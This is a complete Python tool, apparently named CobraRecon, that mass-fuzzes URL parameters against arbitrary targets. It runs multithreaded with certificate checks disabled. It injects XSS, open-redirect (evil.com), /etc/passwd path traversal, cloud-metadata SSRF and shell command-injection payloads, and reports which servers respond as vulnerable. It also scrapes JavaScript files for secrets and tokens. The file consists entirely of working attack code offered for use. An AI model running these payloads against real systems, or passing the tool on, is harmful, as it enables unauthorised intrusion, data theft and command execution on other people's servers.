#!/usr/bin/env python3
import argparse
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""{Fore.LIGHTCYAN_EX}
   ▄████▄   ▒█████   ▄▄▄▄    ▒█████   ██▀███   ▄▄▄█████▓ ▒█████   ███▄    █ 
  ▒██▀ ▀█  ▒██▒  ██▒▓█████▄ ▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
  ▒▓█    ▄ ▒██░  ██▒▒██▒ ▄██▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
  ▒▓▓▄ ▄██▒▒██   ██░▒██░█▀  ▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
  ▒ ▓███▀ ░░ ████▓▒░░▓█  ▀█▓░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░  ▒     ░ ▒ ▒░ ▒░▒   ░   ░ ▒ ▒░   ░▒ ░ ▒░    ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░        ░ ░ ░ ▒   ░    ░ ░ ░ ░ ▒    ░░   ░   ░      ░ ░ ░ ▒     ░   ░ ░ 
  ░ ░          ░ ░   ░          ░ ░     ░                  ░ ░           ░ 
  ░                   ░                                                    
     CobraRecon Universal Vulnerability Scanner
{Style.RESET_ALL}
"""

PAYLOADS = {
    "xss": '"><svg/onload=alert(1)>',
    "redirect": "https://evil.com",
    "lfi": "../../../../etc/passwd",
    "ssrf": "http://169.254.169.254/latest/meta-data/",
}

MATCHES = {
    "xss": re.compile(r'(q=|s=|search=|callback=|return=|next=|url=)', re.I),
    "redirect": re.compile(r'(redirect|url|next|target)', re.I),
    "lfi": re.compile(r'(file=|path=|doc=|page=)', re.I),
    "ssrf": re.compile(r'(url=|uri=|path=|dest=|domain=|load=|file=)', re.I),
    "rce": re.compile(r'(cmd=|exec=|command=|run=|process=|shell=|cli=|query=|call=)', re.I),
}

RCE_PAYLOADS = [
    ";id",
    "|id",
    "&&id",
    "`id`",
    "$(id)",
    "||id",
]

def fuzz_url(url, vulntype, payload=None):
    parsed = urlparse(url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    changed = False
    new_qs = []
    for k, v in qs:
        if not changed and MATCHES[vulntype].search(f"{k}="):
            new_qs.append((k, payload or PAYLOADS[vulntype]))
            changed = True
        else:
            new_qs.append((k, v))
    if not changed:
        return None, None
    new_query = urlencode(new_qs)
    new_url = urlunparse(parsed._replace(query=new_query))
    try:
        if vulntype == "redirect":
            r = requests.head(new_url, allow_redirects=False, timeout=8, verify=False)
            if r.is_redirect and PAYLOADS[vulntype] in r.headers.get('Location', ''):
                return new_url, f"[Redirect] {new_url}"
        elif vulntype == "xss":
            r = requests.get(new_url, timeout=8, verify=False)
            if "<svg" in r.text:
                return new_url, f"[XSS] {new_url}"
        elif vulntype == "lfi":
            r = requests.get(new_url, timeout=8, verify=False)
            if "root:" in r.text:
                return new_url, f"[LFI] {new_url}"
        elif vulntype == "ssrf":
            r = requests.get(new_url, timeout=8, verify=False)
            if "meta-data" in r.text:
                return new_url, f"[SSRF] {new_url}"
        elif vulntype == "rce":
            r = requests.get(new_url, timeout=8, verify=False)
            if re.search(r"uid=\d+|gid=\d+|root:|user=", r.text):
                return new_url, f"[RCE] {new_url} | payload: {payload}"
    except Exception:
        pass
    return None, None

def scan_type(urls, vulntype, outfile, max_threads=20, rce_payloads=None):
    hits = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {}
        if vulntype == "rce" and rce_payloads:
            for url in urls:
                for payload in rce_payloads:
                    futures[executor.submit(fuzz_url, url, vulntype, payload)] = (url, payload)
        else:
            for url in urls:
                futures[executor.submit(fuzz_url, url, vulntype)] = url
        for fut in as_completed(futures):
            try:
                res_url, result = fut.result()
                if result:
                    print(Fore.GREEN + f"{result}" + Style.RESET_ALL)
                    hits.append(result)
            except Exception as e:
                pass
    with open(outfile, "w") as f:
        for hit in hits:
            f.write(f"{hit}\n")
    print(Fore.YELLOW + f"[+] {len(hits)} {vulntype.upper()} results saved in {outfile}" + Style.RESET_ALL)

def scan_js_endpoints(urls, outfile):
    js_urls = [u for u in urls if u.lower().endswith('.js')]
    hits = []
    for js_url in js_urls:
        try:
            r = requests.get(js_url, timeout=8, verify=False)
            if re.search(r"(api/|token|key|auth|endpoint|password|user|url|secret)", r.text, re.I):
                hits.append(f"[JS-Interesting] {js_url}")
        except Exception:
            continue
    with open(outfile, "w") as f:
        for hit in hits:
            f.write(f"{hit}\n")
    print(Fore.LIGHTCYAN_EX + f"[+] {len(hits)} interesting JS endpoints saved in {outfile}" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(description="CobraRecon: Universal Vulnerability Scanner")
    parser.add_argument("-i", "--input", required=True, help="Input file (list of URLs with parameters)")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("--threads", type=int, default=20, help="Number of threads (default: 20)")
    args = parser.parse_args()

    os.makedirs(args.output, exist_ok=True)

    print(BANNER)
    with open(args.input) as f:
        urls = [line.strip() for line in f if "=" in line]

    print(Fore.CYAN + f"[*] Scanning for XSS..." + Style.RESET_ALL)
    xss_urls = [u for u in urls if MATCHES["xss"].search(u)]
    scan_type(xss_urls, "xss", os.path.join(args.output, "xss_hits.txt"), args.threads)

    print(Fore.CYAN + f"[*] Scanning for Open Redirects..." + Style.RESET_ALL)
    redirect_urls = [u for u in urls if MATCHES["redirect"].search(u)]
    scan_type(redirect_urls, "redirect", os.path.join(args.output, "redirect_hits.txt"), args.threads)

    print(Fore.CYAN + f"[*] Scanning for LFI..." + Style.RESET_ALL)
    lfi_urls = [u for u in urls if MATCHES["lfi"].search(u)]
    scan_type(lfi_urls, "lfi", os.path.join(args.output, "lfi_hits.txt"), args.threads)

    print(Fore.CYAN + f"[*] Scanning for SSRF..." + Style.RESET_ALL)
    ssrf_urls = [u for u in urls if MATCHES["ssrf"].search(u)]
    scan_type(ssrf_urls, "ssrf", os.path.join(args.output, "ssrf_hits.txt"), args.threads)

    print(Fore.CYAN + f"[*] Scanning for RCE..." + Style.RESET_ALL)
    rce_urls = [u for u in urls if MATCHES["rce"].search(u)]
    scan_type(rce_urls, "rce", os.path.join(args.output, "rce_hits.txt"), args.threads, RCE_PAYLOADS)

    print(Fore.CYAN + "[*] Scanning for interesting JS endpoints..." + Style.RESET_ALL)
    scan_js_endpoints(urls, os.path.join(args.output, "js_hits.txt"))

    print(Fore.GREEN + f"[+] All results saved in {args.output}/" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
